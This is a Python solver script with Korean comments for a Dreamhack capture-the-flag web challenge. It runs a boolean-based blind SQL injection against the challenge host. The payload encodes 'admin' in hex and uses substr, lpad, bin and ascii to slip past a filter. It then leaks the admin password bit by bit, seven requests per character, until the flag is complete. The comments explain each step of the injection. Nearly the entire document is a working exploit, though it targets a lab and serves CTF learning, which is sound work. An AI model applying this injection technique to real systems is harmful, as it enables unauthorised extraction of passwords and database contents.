'''
solution..!
- bypassWAF에 있는 풀이소스..
- 비트 하나하나를 받아와서 7번의 요청으로 1바이트를 알아낼 수 있는 기법을 사용했다고 함
'''
import requests
from urllib import parse

s = requests.Session()

url = "http://host3.dreamhack.games:22438/?uid="
query = "'||uid=0x61646d696e&&substr(lpad(bin(ascii(substr(upw,{},1))),7,0),{},1)#" 
'''
0x61646d696e => admin
substr -> i번째에 위치한 글자 한개를 가져옴
ascii -> 아스키 10진수로 변환
bin -> binary 값으로 변환
lpad -> 왼쪽부터 길이만큼 문자를 채워줌

ex)
flag값인 첫번째 D의 경우..
substr(upw, 1, 1) -> D
ascii(substr(upw, 1, 1)) -> 68
bin(ascii(substr(upw, 1, 1))) -> 1000100
lpad(bin(ascii(substr(upw, 1, 1))), 7, 0) -> 1000100
substr(lpad(bin(ascii(substr(upw, 1, 1))), 7, 0), 1 ~ 7, 1) -> 1부터 7번째 자리 까지 찍으면서 비트 정보 확인. 1이면 admin이 select 될것이고, 0이면 empty가 나옴.
'''
i = 1
flagbit = 0
flag = ''

while(1) :
    for j in range(1,8) : 
        res = s.get(url + parse.quote(query.format(i,j)))   # format을 사용해서 i, j 대입. quote -> 특수문자를 문자열로 반환
        print(i,j)
        if "admin" in res.text :
            flagbit += 1 << (7 - j) # 
    flag += chr(flagbit) # 아스키코드를 문자열로 다시 변환
    flagbit = 0
    print(flag)
    if(flag[-1] == "}") :
        break
    i += 1